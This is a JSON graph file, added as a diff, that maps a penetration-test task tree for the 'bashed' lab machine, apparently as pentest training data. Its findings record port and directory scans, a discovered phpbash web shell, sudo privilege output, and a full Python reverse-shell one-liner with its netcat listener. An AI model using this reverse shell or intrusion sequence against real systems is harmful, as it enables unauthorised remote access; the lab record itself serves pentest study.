@@ -1,0 +1,648 @@
+{
+  "machine": "bashed",
+  "row_index": 4,
+  "legend": {
+    "node_types": {
+      "State (Blue)": "Pentest phase / sub-phase, or informational item (target IP, hostname, machine name, OS, ...)",
+      "Action (Orange)": "A concrete action the pentester performed",
+      "Finding (Green)": "The result/finding produced by an Action"
+    },
+    "status_shading": {
+      "dark": "completed",
+      "mid": "in_progress",
+      "light": "to_do"
+    },
+    "edge_types": {
+      "StateTransition (Black)": "State -> State, advancing through the PTT",
+      "SearchUpdate (Green)": "State -> Action, starting work on a PTT item",
+      "TrackUpdate (Blue)": "Action -> Finding, item execution produced findings",
+      "Prediction (Purple)": "Finding -> State, findings lead back into state"
+    }
+  },
+  "nodes": [
+    {
+      "id": "state:bashed:r4:START",
+      "label": "State: Start",
+      "type": "State",
+      "color": "#3A86FF",
+      "status": "in_progress",
+      "title": "Start of pentest tree snapshot for 'bashed' (row 4).",
+      "size": 30,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:bashed:r4:1",
+      "label": "State 1\nReconnaissance",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1 Reconnaissance [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:bashed:r4:1.1",
+      "label": "State 1.1\nPassive Information Gathering",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.1 Passive Information Gathering [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:bashed:r4:1.2",
+      "label": "State 1.2\nActive Information Gathering",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.2 Active Information Gathering [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:bashed:r4:1.3",
+      "label": "State 1.3\nIdentify Open Ports, Services…",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.3 Identify Open Ports, Services running on the open ports and their versions [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:bashed:r4:1.3.1",
+      "label": "Action 1.3.1\nPerform a port scan",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.3.1 Perform a port scan [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:bashed:r4:1.3.1",
+      "label": "Finding 1.3.1\nTarget IP: 10.129.237.16, Hos…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Target IP: 10.129.237.16, Host Status: Up, Latency: 0.70s, Closed TCP Ports: 999 (connection refused), Open Ports: Port 80/tcp (State: Open)",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:bashed:r4:1.3.2",
+      "label": "Action 1.3.2\nDetermine the services and ve…",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.3.2 Determine the services and versions on each open port [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:bashed:r4:1.3.2",
+      "label": "Finding 1.3.2\nTarget IP: 10.129.237.16, Ser…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Target IP: 10.129.237.16, Service: HTTP, Version: Apache HTTPD 2.4.18 (Ubuntu), HTTP Title: Arrexel's Development Site, HTTP Server Header: Apache/2.4.18 (Ubuntu)",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:bashed:r4:1.3.3",
+      "label": "Action 1.3.3\nEnumerate HTTP service",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.3.3 Enumerate HTTP service [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:bashed:r4:1.3.3",
+      "label": "Finding 1.3.3\nURL: http://10.129.237.16, Me…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "URL: http://10.129.237.16, Method: GET, Threads: 10, Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt, Negative Status codes: 404, User Agent: gobuster/3.6, Timeout: 10s, Directory enumeration: /images, /uploads, /php, /css, /dev, /js",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:bashed:r4:1.3.4",
+      "label": "Action 1.3.4\nExplore the directories",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.3.4 Explore the directories [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:bashed:r4:1.3.4",
+      "label": "Finding 1.3.4\nDirectory: /dev, Files found:…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Directory: /dev, Files found: phpbash.min.php (Last Modified: 2017-12-04 12:21, Size: 4.6K), phpbash.php (Last Modified: 2017-11-30 23:56, Size: 8.1K), Server: Apache/2.4.18 (Ubuntu), Server IP: 10.129.237.16, Port: 80",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:bashed:r4:1.3.5",
+      "label": "Action 1.3.5\nExploit the PHP files",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.3.5 Exploit the PHP files [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:bashed:r4:1.3.5",
+      "label": "Finding 1.3.5\nReverse Shell Command: python…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Reverse Shell Command: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.16\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);', Netcat Listening Command: nc -nvlp 4444, Listening Address: 0.0.0.0 4444, Connection Received From: 10.129.237.16 38456, Shell Access: /bin/sh, Current User: www-data",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:bashed:r4:1.4",
+      "label": "State 1.4\nPrivilege Escalation",
+      "type": "State",
+      "color": "#3A86FF",
+      "status": "in_progress",
+      "title": "1.4 Privilege Escalation [in_progress]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:bashed:r4:1.4.1",
+      "label": "Action 1.4.1\nCheck user privileges",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.4.1 Check user privileges [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:bashed:r4:1.4.1",
+      "label": "Finding 1.4.1\nSudo List Command: sudo -l, U…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Sudo List Command: sudo -l, User: www-data, Defaults: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, User www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:bashed:r4:1.4.2",
+      "label": "Action 1.4.2\nExplore server files",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.4.2 Explore server files [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:bashed:r4:1.4.2",
+      "label": "Finding 1.4.2\nServer Files (ls -la): Direct…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Server Files (ls -la): Directories: bin, boot, dev, etc, home, lib, lib64, media, mnt, opt, proc, root, run, sbin, scripts, srv, sys, usr, var, Special Files: .bash_history, initrd.img (link to boot/initrd.img-4.4.0-62-generic), vmlinuz (link to boot/vmlinuz-4.4.0-62-generic), Notable Directory: scripts (owned by scriptmanager, group scriptmanager, permissions: drwxrwxr--), Lost+Found Directory: lost+found (owned by root, permissions: drwx------), Temporary Directory: tmp (permissions: drwxrwxrwt)",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "from": "state:bashed:r4:START",
+      "to": "state:bashed:r4:1",
+      "label": "1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:bashed:r4:1",
+      "to": "state:bashed:r4:1.1",
+      "label": "1.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:bashed:r4:1.1",
+      "to": "state:bashed:r4:1.2",
+      "label": "1.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:bashed:r4:1.2",
+      "to": "state:bashed:r4:1.3",
+      "label": "1.3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:bashed:r4:1.3",
+      "to": "action:bashed:r4:1.3.1",
+      "label": "1.3.1 Perform a port sc…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:bashed:r4:1.3.1",
+      "to": "finding:bashed:r4:1.3.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:bashed:r4:1.3.1",
+      "to": "state:bashed:r4:1.3",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:bashed:r4:1.3",
+      "to": "action:bashed:r4:1.3.2",
+      "label": "1.3.2 Determine the ser…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:bashed:r4:1.3.2",
+      "to": "finding:bashed:r4:1.3.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:bashed:r4:1.3.2",
+      "to": "state:bashed:r4:1.3",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:bashed:r4:1.3",
+      "to": "action:bashed:r4:1.3.3",
+      "label": "1.3.3 Enumerate HTTP se…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:bashed:r4:1.3.3",
+      "to": "finding:bashed:r4:1.3.3",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:bashed:r4:1.3.3",
+      "to": "state:bashed:r4:1.3",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:bashed:r4:1.3",
+      "to": "action:bashed:r4:1.3.4",
+      "label": "1.3.4 Explore the direc…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:bashed:r4:1.3.4",
+      "to": "finding:bashed:r4:1.3.4",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:bashed:r4:1.3.4",
+      "to": "state:bashed:r4:1.3",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:bashed:r4:1.3",
+      "to": "action:bashed:r4:1.3.5",
+      "label": "1.3.5 Exploit the PHP f…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:bashed:r4:1.3.5",
+      "to": "finding:bashed:r4:1.3.5",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:bashed:r4:1.3.5",
+      "to": "state:bashed:r4:1.3",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:bashed:r4:1.3",
+      "to": "state:bashed:r4:1.4",
+      "label": "1.4",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:bashed:r4:1.4",
+      "to": "action:bashed:r4:1.4.1",
+      "label": "1.4.1 Check user privil…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:bashed:r4:1.4.1",
+      "to": "finding:bashed:r4:1.4.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:bashed:r4:1.4.1",
+      "to": "state:bashed:r4:1.4",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:bashed:r4:1.4",
+      "to": "action:bashed:r4:1.4.2",
+      "label": "1.4.2 Explore server fi…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:bashed:r4:1.4.2",
+      "to": "finding:bashed:r4:1.4.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:bashed:r4:1.4.2",
+      "to": "state:bashed:r4:1.4",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    }
+  ],
+  "graph_statistics": {
+    "total_nodes": 20,
+    "total_edges": 26,
+    "state_nodes": 6,
+    "action_nodes": 7,
+    "finding_nodes": 7,
+    "ptt_items_parsed": 12
+  },
+  "csv_row_index": 4,
+  "source_csv": "training_data.csv"
+}
